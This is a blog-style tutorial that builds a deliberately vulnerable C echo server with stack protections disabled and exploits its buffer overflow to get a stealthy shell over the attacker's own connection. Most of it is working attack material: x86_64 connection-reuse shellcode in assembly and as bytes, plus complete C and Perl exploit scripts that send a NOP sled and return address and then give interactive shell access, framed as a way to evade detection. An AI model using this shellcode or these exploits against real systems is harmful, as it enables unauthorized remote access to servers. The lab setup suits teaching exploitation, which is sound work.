---
title: "Stealthy Remote Shells: A Sophisticated Technique for Gaining Remote Access and Evading Detection"
author: fortyfour
date: 2023-06-029 23:31
categories: [Evasion, Remote Shells]
tags: [binary exploitation, exploit, buffer overflow, remote shell, evasion, developement, networking, shellcode, assembly, x86, x86_64, linux, c]
image: /assets/img/media/protocols-header.jpg
---

Protocols, the backbone that enables seamless communication across the vast landscape of electronic systems.

---

<details>
  <summary><strong>Table of Contents</strong></summary>
<div markdown="1">
Table of Contents:

1. Introduction
2. The Process of Generating Shellcode
   2.1 Compiling the Code
   2.2 Extracting Machine Code from the Compiled File
3. Crafting the Exploit
   3.1 Overview of the Exploit Script
4. Conclusion
5. Appendix: Exploiting Servers with Activated Security Features
   5.1 Reactivating ASLR
   5.2 Making the Stack Non-Executable
   5.3 Reactivating Stack Protection
   5.4 Enhanced Compilation Options

</div>
</details>

## Introduction

In this paper, I will present a sophisticated technique (based on my opinion) for gaining shell access to a vulnerable remote machine. Although the technique is not my own creation, I found it highly intriguing. The primary focus of this paper is on detailing this technique rather than delving into the process of exploiting the vulnerability itself.

## Setting up the environment:

To streamline the discussion and concentrate on the remote shell code, we will temporarily disable certain security features such as ASLR (Address Space Layout Randomization) and non-executable stacks. Exploring these mechanisms extensively would require a significant amount of additional content. Once the shellcode is prepared, it is recommended to restore these protections and attempt to exploit the program again. This exercise can provide valuable insights and serve as an engaging challenge.

To begin, we will disable ASLR by executing the following command:
```terminal
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Please note that this change is temporary and will revert upon the next system reboot. In case you wish to restore ASLR without rebooting your machine, you can use the following command:
```terminal
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
To disable the remaining security functions, we will employ the following compilation flags when compiling our vulnerable server:
```
-fno-stack-protector -z execstack
```
These flags effectively deactivate stack canaries and grant execution permissions to the stack, providing us with a straightforward environment for exploitation.

Creating a vulnerable service:

Now, let's construct a simple echo server with a remote buffer overflow vulnerability that we can exploit. The program is straightforward, and you should be able to identify the buffer overflow in the provided code. Take a look:

```c
#include <stdio.h>
#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int process_request(int s1, char *reply) {
  char result[256];

  strcpy(result, reply);
  write(s1, result, strlen(result));
  printf("Result: %p\n", &result);
  return 0;
}

int main(int argc, char *argv[]) {
  struct sockaddr_in server, client;
  socklen_t len = sizeof(struct sockaddr_in);
  int s, s1, ops = 1;
  char reply[1024];

  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_family = AF_INET;
  server.sin_port = htons(9000);

  s = socket(PF_INET, SOCK_STREAM, 0);
  if ((setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &ops, sizeof(ops))) < 0)
    perror("pb_server (reuseaddr):");
  bind(s, (struct sockaddr *)&server, sizeof(server));
  listen(s, 10);

  while (1) {
    s1 = accept(s, (struct sockaddr *)&client, &len);
    printf("Connection from %s\n", inet_ntoa(client.sin_addr));
    memset(reply, 0, 1024);
    read(s1, reply, 1024);
    process_request(s1, reply);
    close(s1);
  }
  return 0;
}
```

The code represents a standard implementation of an echo server. Let's compile it and transform it into the easiest server to exploit:
```terminal
gcc -g -fno-stack-protector -z execstack -o target target.c
```
Now, to verify its vulnerability, launch the compiled server in one terminal. In another terminal, execute the following command:
```terminal
$ perl -e 'print "A"x1024;' | nc localhost 9000
```
In the terminal running the server, you should observe an output similar to this:
```terminal
$ ./target
Connection from 127.0.0.1
Result

: 0x7fffffffdbf0
Segmentation fault (core dumped)
```
This outcome confirms the vulnerability and demonstrates that a segmentation fault occurred due to the buffer overflow.

In the previous section, I added a print statement to display the address of a local variable, allowing you to verify that ASLR (Address Space Layout Randomization) is indeed disabled. Each execution of the same binary should consistently yield the same address (unless you modify the program).

Now, you can practice exploiting this program to obtain a local shell using various available shellcodes. Although it may seem straightforward, I strongly recommend that you attempt it at least once. However, I will not cover the process here, as there are numerous tutorials available on exploiting buffer overflows under these conditions. A simple Google search will provide you with ample resources.

## The Remote Shell:

It is now time to acquire a remote shell. The key aspect here is the "remote" factor, which implies that there is a network connection between the vulnerable machine and the attacker. In other words, data must be sent and received through a socket. Based on this premise, there are essentially two ways to obtain a remote shell:

1. Direct Remote Shell:
   In this scenario, your shellcode creates a server socket that enables external connections, facilitating the flow of data to and from a local shell. This approach involves setting up a server that waits for connections.

2. Reverse Remote Shell:
   With a reverse remote shell, your shellcode establishes a connection back to a pre-determined host where a waiting server accepts the connection from the victim. This method requires storing the address and port information within your payload to establish the connection.

You may want to read "Remote Shells. Part I" for more detailed information on these two types of remote shells.

These definitions may remind some of you about the RHOST/RPORT variables or similar concepts. These variables are used to specify the address and port for the payload to connect to. In a reverse shell scenario, you embed this information in your payload to establish the connection. For a direct shell, you typically only need to define the port, as the server will be waiting for incoming connections.

However, there is a third option, at least for Unix machines, which involves connection reuse.

## Connection Reuse:

When executing a remote exploit to take advantage of a vulnerability, you are already connected to the server. So, why not leverage the existing connection? This approach is advantageous because it doesn't raise any suspicion on the victim's side, such as revealing open ports for unknown services or unexpected outgoing connections from a server.

The ingenious method to achieve connection reuse relies on the fact that the operating system assigns file descriptors sequentially. Knowing this, we can duplicate an existing file descriptor immediately after establishing our connection. In most cases, this duplication will result in a file descriptor equal to the socket's file descriptor associated with our connection plus one (i.e., the file descriptor assigned just before our connection).

Once we identify the file descriptor for our active connection, we can duplicate it to file descriptors 0, 1, and 2 (representing stdin, stdout, and stderr, respectively) and then spawn a shell. From that point onward, all input and output for that shell will be redirected through the socket.

Still confused? If you haven't already, it may be a good time to read "Remote Shells. Part I" to gain a better understanding of this concept.

The C code implementing this technique is as follows:

```c
int sck = dup(0) - 1; // Duplicate stdin
dup2(sck, 0);
dup2(sck, 1);
dup2(sck, 2);
execv("/bin/sh", NULL);
```

As you can see, there is no explicit socket code involved! If we convert this code into a shellcode and successfully exploit the remote server to execute it, we will gain shell access to the remote machine through the same connection we used to deliver the exploit to the remote server.

Some of you may have noticed that, as with any technique, there are drawbacks. We already mentioned that under heavy server load, our duplication trick may fail, allowing someone else to gain shell access instead. Additionally, a properly designed server will close all file descriptors before becoming a daemon (see `man daemon`), which means we may need to experiment with alternative values for the `dup` function.

This technique was brought to my attention by @_py during a discussion we had some time ago. The original code we reviewed at that time can be found here: [shellcode-881](http://shell-storm.org/shellcode/files/shellcode-881.php). However, that code is written for 32-bit systems. Therefore, I created my own version for 64-bit systems and even developed a Perl script to run the exploit.

The 64-bit Version of the Shellcode:

I must admit that I'm not particularly proud of it (as it reminded me how rusty my assembly language skills have become), but it works. Furthermore, it is only three bytes longer than the original 32-bit version. Here it is:

```assembly
section .text
global _start
_start:
    ; s = Dup(0) - 1
    xor rax, rax
    push rax
    push rax
    push rax
    pop rsi
    pop rdx
    push rax
    pop rdi
    mov al, 32
    syscall ; DUP (rax=32) rdi = 0 (dup(0))

    dec rax
    push rax
    pop rdi ; mov rdi, rax ; dec rdi

    ; dup2(s, 0); dup2(s, 1); dup2(s, 2)
loop:
    mov al, 33
    syscall ; DUP2 (rax=33) rdi=oldfd (socket) rsi=newfd
    inc rsi
    mov rax, rsi
    cmp al, 2 ; Loop 0, 1, 2 (stdin, stdout, stderr)
    jne loop

    ; exec(/bin/sh)
    push rdx ; NULL
    mov qword rdi, 0x68732f6e69622f2f ; "//bin/sh"
    push rdi ; command
    push rsp
    pop rdi

    push rdx ; env
    pop rsi ; args

    mov al, 0x3b ; EXEC (rax=0x4b) rdi="/bin/sh" rsi=rdx=
    syscall
```

I added some comments to clarify the less obvious parts, and you will notice a significant number of push/pop instructions. The reason for this is that a PUSH/POP pair is only two bytes, whereas a MOV instruction is three bytes. This approach makes the code slightly shorter, but also considerably uglier. Frankly, I'm not sure if it's a good idea. However, feel free to improve upon it and share your versions in the comments. If you have any doubts about the code, don't hesitate to ask.

Generating our Shellcode

Now, we have to get the shellcode in a format suitable to be send to the remote server. For doing that we have to first compile the code and then extract the machine code out of the compiled file. Compiling (assembling in this case) is straight forward:
```terminal
nasm -f elf64 -o rsh.o rsh.asm
```
There are many different ways to get the binary data out of the object file. I use these nifty trick that produce a string in a format that I can easily add to a Perl or C program.
```terminal
for i in $(objdump -d rsh.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
```
The two commands above will produce the following shellcode:
```shellcode
\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05
```

Time to write the exploit

## The Exploit

So we have a remote vulnerable system. You have figure out how to exploit the buffer overflow in our low-secured environment and we also have a shellcode to run on the remote system. Now we need a exploit. The exploit will put all this together and give us the remote shell we are looking for.

There are many ways to write it. I’ve used used Perl for mine. Of course. :stuck_out_tongue_winking_eye:

This is how it looks like:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define BUF_SIZE 1024

int main() {
    int sockfd;
    struct sockaddr_in server_addr;

    char *shellcode = "\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05";
    char *addr = "\x10\xdd\xff\xff\xff\x7f\x00\x00";
    int off = 264;

    int nops = off - strlen(shellcode);
    int payload_size = nops + strlen(shellcode) + strlen(addr);
    char payload[payload_size];

    memset(payload, '\x90', nops);
    strcat(payload, shellcode);
    strcat(payload, addr);

    printf("SLED %d Shellcode: %zu Payload size: %zu\n", nops, strlen(shellcode), strlen(payload));

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    server_addr.sin_port = htons(9000);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }

    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(STDIN_FILENO, &readfds);
    FD_SET(sockfd, &readfds);

    int flag = 1;

    while (1) {
        fd_set testfds = readfds;
        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 100000;

        if (select(sockfd + 1, &testfds, NULL, NULL, &timeout) < 0) {
            perror("Select failed");
            exit(EXIT_FAILURE);
        }

        if (FD_ISSET(sockfd, &testfds)) {
            char response[BUF_SIZE];
            memset(response, 0, sizeof(response));
            ssize_t recv_size = recv(sockfd, response, sizeof(response) - 1, 0);
            if (recv_size < 0) {
                perror("Receive failed");
                exit(EXIT_FAILURE);
            }
            printf("%s", response);
        }

        if (FD_ISSET(STDIN_FILENO, &testfds)) {
            flag = 1;
            char line[BUF_SIZE];
            memset(line, 0, sizeof(line));
            if (fgets(line, sizeof(line), stdin) != NULL) {
                if (send(sockfd, line, strlen(line), 0) < 0) {
                    perror("Send failed");
                    exit(EXIT_FAILURE);
                }
            }
        }

        if (!FD_ISSET(STDIN_FILENO, &testfds) && !FD_ISSET(sockfd, &testfds)) {
            if (flag) {
                printf("0x00pf]> ");
                flag = 0;
            }
        }
    }

    close(sockfd);
    return 0;
}
```

```perl
#!/usr/bin/perl
use IO::Select;
use IO::Socket::INET;
$|=1;

print "Remote Exploit Example";
print "by 0x00pf for 0x00sec :)\n\n";

# You may need to calculate these magic numbers for your system
$addr = "\x10\xdd\xff\xff\xff\x7f\x00\x00"; 
$off = 264;

# Generate the payload
$shellcode = "\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05";

$nops = $off - length $shellcode;
$payload = "\x90" x $nops . $shellcode . $addr;

$plen = length $payload;
$slen = length $shellcode;
print "SLED $nops Shellcode: $slen Payload size: $plen\n";

# Connect
my $socket = new IO::Socket::INET (
    PeerHost => '127.0.0.1',
    PeerPort => '9000',
    Proto => 'tcp',
    );
# Set up select for asynchronous read from the server
$sel = IO::Select->new( $socket );
$sel->add(\*STDIN);

# Exploit!
$socket->send ($payload);
$socket->recv ($trash,1024);
$timeout = .1;

$flag = 1; # Just to show a prompt

# Interact!
while (1) {
    if (@ready = $sel->can_read ($timeout))  {
	foreach $fh (@ready) {
	    $flag =1;
	    if($fh == $socket) {
		$socket->recv ($resp, 1024);
		print $resp;
	    }
	    else { # It is stdin
		$line = <STDIN>;
		$socket->send ($line);
	    }
	}
    }	
    else { # Show the prompt whenever everything's been read
	print "0x00pf]>  " if ($flag);
	$flag = 0;
    }	
}
```

The beginning of the exploit is pretty much the standard stuff. Generate the payload based on the magic numbers you had figured out with the help of gdb (note that those number may be different in your system, and the exploit as it is may not just work).

But then, we have to do something else for our special remote shell. With direct and reverse shells, once the exploit has been run and have done its job, we will normally use another program/module to connect to or to receive the connection from the remote machine. It can be netcat or your preferred pentesting platform or your own tool,…

However, in this case we are accessing the shell using an already establish connection. The one we used to send the payload. So I added some code to read commands from stdin and send them to the remote server and also to read data from the remote shell. This is the final part of the exploit. It is standard networking code. Nothing really special in there.

Now, you can try your remote shell exploit!
Conclusions

In this paper we have discussed a technique to get pretty stealth shell access to a remote vulnerable server without the need to deal with the sockets API provided by the system. This makes the development of the shellcode simpler and also makes it shorter (check this one for example http://shell-storm.org/shellcode/files/shellcode-858.php 141).

Be free to improve the shellcode and post it in the comments. Also, if somebody wants to try to exploit the server when the system security features are activated, please be my guest. That will involve:

    Reactivate ASLR (you already know how to do that)
    Make stack not executable (remove the -zexecstack flag or use the execstack tool)
    Reactivate stack protection (remove the -fno-stackprotector flag)
    Go Pro (compile with -DFORTIFY_SOURCE=2 or use -O2)
    Go master (compile with -O2 -fPIC -pie -fstack-protector-all -Wl,-z,relro,-z,now)

Hack Fun!

https://shell-storm.org/shellcode/files/shellcode-858.html

https://shell-storm.org/shellcode/files/shellcode-881.html